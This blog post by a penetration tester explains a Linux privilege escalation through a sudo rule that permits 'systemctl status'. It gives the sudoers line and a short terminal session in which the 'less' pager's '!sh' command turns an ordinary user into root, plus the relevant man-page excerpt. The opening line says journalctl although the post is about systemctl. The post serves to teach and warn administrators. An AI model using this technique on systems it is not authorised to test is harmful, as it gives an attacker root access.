---
layout: post
title: sudo systemctl LPE
tags: sudo systemd systemctl privilege escalation linux pentest vulnerability LPE PoC
---
### Brief PoC showing the exploitation of an insecure sudo rule for journalctl, found in the wild.

Many of the sudo rules encountered in the wild are insecure. This is one such example.
Any other program printing its output via the pager `less` will also be vulnerable.
Many other pagers are similarly affected and can also be abused.

This is neither a vulnerability in `less`, `systemctl`, or `sudo`, but a misconfiguration by the admins.
Of course it could be argued that systemctl should not use a pager that can span new processes.
Generally speaking, I've reached the conclusion that sudo rules are harmful as they are often insecure.

### vulnerable sudo systemctl rule
This rould would allow *some_user* to check the status of *some_service*.
*/etc/sudoers.d/10_any_name_here*
```
some_user ALL = NOPASSWD: /bin/systemctl status some_service.service
```

### PoC
```
# Make the terminal so small that it has fewer lines than will be printed
some_user@pentest-app-1:/etc/sudoers.d$ id
uid=1004(some_user) gid=1004(some_user) groups=1004(some_user)
some_user@pentest-app-1:/etc/sudoers.d$ sudo /bin/systemctl status some_service.service

● some_service.service - SomeService HTTP Server
        Loaded: loaded (/lib/systemd/system/some_service.service; enabled; vendor preset: enabled)
[...]

!sh
sh-5.1# id
uid=0(root) gid=0(root) groups=0(root)
```

### Explanation
systemctl appears to use the pager `less`.
`less` will be running with elevated privileges.
`less` will exit once it has displayed all its output.
By making our terminal really small, `less` will wait with exiting for us to scroll to the end.
We can use this to spawn a new process with the elevated privileges of `less`.
Thereby, potentially gaining a root shell.


### excert from *less*'s man page
```
       ! shell-command
              Invokes  a  shell  to run the shell-command given.  A percent sign (%) in the command is replaced by the name of the current file.  A pound sign (#) is re‐
              placed by the name of the previously examined file.  "!!" repeats the last shell command.  "!" with no shell command simply invokes a shell.  On Unix  sys‐
              tems, the shell is taken from the environment variable SHELL, or defaults to "sh".  On MS-DOS and OS/2 systems, the shell is the normal command processor.

       # shell-command
              Similar  to  the  "!"  command,  except that the command is expanded in the same way as prompt strings.  For example, the name of the current file would be
              given as "%f".
```

See also: [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)

Years ago, when i was struggling with the brilliant OTW CTF challenge that taught me this nifty trick, little did I guess that this principle could ever be applicable in the wild. But as it turns out, it is not an uncommon misconfiguration pattern.
